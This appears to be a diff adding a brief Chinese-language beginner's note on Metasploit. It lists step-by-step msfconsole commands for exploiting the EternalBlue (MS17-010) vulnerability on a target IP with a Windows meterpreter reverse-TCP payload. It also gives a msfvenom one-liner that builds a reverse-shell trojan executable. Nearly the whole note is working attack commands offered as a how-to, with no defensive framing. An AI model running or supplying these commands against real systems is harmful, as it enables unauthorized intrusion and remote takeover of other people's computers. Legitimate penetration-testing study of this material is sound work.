@@ -1,0 +1,26 @@
+一些英语单词：
+Payload 有效载荷
+options 可选择的事物
+
+
+一，有ip地址直接攻击
+msfconsole：启动metasploit命令行
+msf使用三步走：使用模块——配置模块必选项——运行模块
+search ms17_010:查看永恒之蓝漏洞
+1.use 0：使用哪个漏洞
+show options：查看配置信息
+2.设置必选项
+set RHOSTS 192.168.1.128                         [*RHOSTS为target host(s)代表你要攻击谁]
+set payload windows/x64/meterpreter/reverse_tcp  [*payload是攻击载荷，就是攻击完成后想干啥,这里是想获取meterpreter]                                               [*meterpreter是metasploit后渗透的神器]
+set LHOST 192.108.1.136                          [*LHOSTS为listen host 代表你是谁，既Kali的IP地址]
+set LPORT 12345                                  [*LPORT为listen port，代表你要在kali上开启的端口，1-65535随便选，但不能被占用]
+3.run
+4.help：看看怎么控制这台电脑
+
+二，生成木马病毒
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.136 lport=9999 -f exe -o demo9999.exe
+
+
+
+
+
